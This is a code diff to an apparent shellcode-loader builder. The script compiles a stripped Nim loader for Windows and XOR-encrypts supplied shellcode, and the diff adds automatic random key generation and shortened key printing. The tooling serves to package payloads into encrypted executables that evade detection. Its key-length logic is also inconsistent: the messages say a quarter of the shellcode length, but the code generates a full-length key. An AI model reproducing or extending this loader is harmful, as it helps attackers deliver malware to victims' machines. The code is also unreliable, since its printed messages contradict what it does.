@@ -82,7 +82,7 @@ def write_shellcode_template(technique, shellcode, sleep_time):
         sys.exit(1)
 
 def compile_shellcode_loader(output_path):
-    subprocess.run(["nim", "c", "--cpu:amd64", "--os:windows", "--gcc.exe:x86_64-w64-mingw32-gcc", "--gcc.linkerexe:x86_64-w64-mingw32-gcc", "-d:release", "-d:strip", "--opt:size", f"-o:{output_path}", f"{CWD}/build/exec.nim"], stdout=subprocess.DEVNULL)
+    subprocess.run(["nim", "c", "--app:console", "--cpu:amd64", "--os:windows", "--gcc.exe:x86_64-w64-mingw32-gcc", "--gcc.linkerexe:x86_64-w64-mingw32-gcc", "-d:release", "-d:strip", "--opt:size", f"-o:{output_path}", f"{CWD}/build/exec.nim"], stdout=subprocess.DEVNULL)
     print("[+] Shellcode loader compiled")
 
 if __name__ == '__main__':
@@ -97,8 +97,16 @@ if __name__ == '__main__':
 
     shellcode = open(arguments["<shellcode_path>"], 'rb').read()
 
+    if len(key) < len(shellcode) and encryption == "xor":
+        print("[-] When using xor, the key must be at least as long as quarter of the shellcode length")
+        print(f"[+] Generating random key of {len(shellcode)//4} bytes")
+        key = random_key(len(shellcode))
+
     if key:
-        print(f"[+] Using {encryption} key: {key.hex()}")
+        if len(key) <= 32:
+            print(f"[+] Using {encryption} key: {key.hex()}")
+        else:
+            print(f"[+] Using {encryption} key: {str(key.hex())[:32]}...")
 
         if encryption == "xor":
             shellcode_enc = xor_shellcode(shellcode, key)
